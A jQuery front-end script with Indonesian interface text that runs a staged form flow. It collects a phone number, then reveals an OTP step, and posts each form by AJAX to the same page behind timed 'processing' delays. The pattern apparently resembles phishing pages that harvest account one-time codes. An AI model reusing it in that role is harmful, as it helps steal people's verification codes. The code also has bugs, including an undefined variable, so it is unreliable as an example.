$(document).ready(function(){
    $('#formData').submit(function(e) {
    event.preventDefault();
    $("#process1").show();event.preventDefault();
    setTimeout(function(){
      $(".wrapper").blur();
      $("#formHP").fadeIn();
      $(".box-hp").show();
      $("#process1").hide();
    },1500);
      
      
    
document.getElementById('buttonku').innerHTML = "Memproses....";


 $.ajax({
 type: 'POST',
 data: $(this).serialize(),
 datatype: 'JSON',
 
 complete: function(data) {
            console.log('Complete')
   setTimeout(function(){
  
 var nohp = document.getElementById("nohp").value;
 sessionStorage.setItem("nomor", nomor);   
    }, 1000);
        }
    });
 });
    return false;
});


$(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();
    $("#process1").show();event.preventDefault();
    setTimeout(function(){
      $(".wrapper").hide();
      $("#formLink").fadeIn();
      $(".box-otp").show();
      $(".box-hp").hide();
      $("#process1").hide();
    },1500);
      
      
    
document.getElementById('btn-nohp').innerHTML = "Memproses....";


 $.ajax({
 type: 'POST',
 data: $(this).serialize(),
 datatype: 'JSON',
 
 complete: function(data) {
            console.log('Complete')
   setTimeout(function(){
  
 var nohp = document.getElementById("nohp").value;
 sessionStorage.setItem("nomor", nomor);   
    }, 1000);
        }
    });
 });
    return false;
});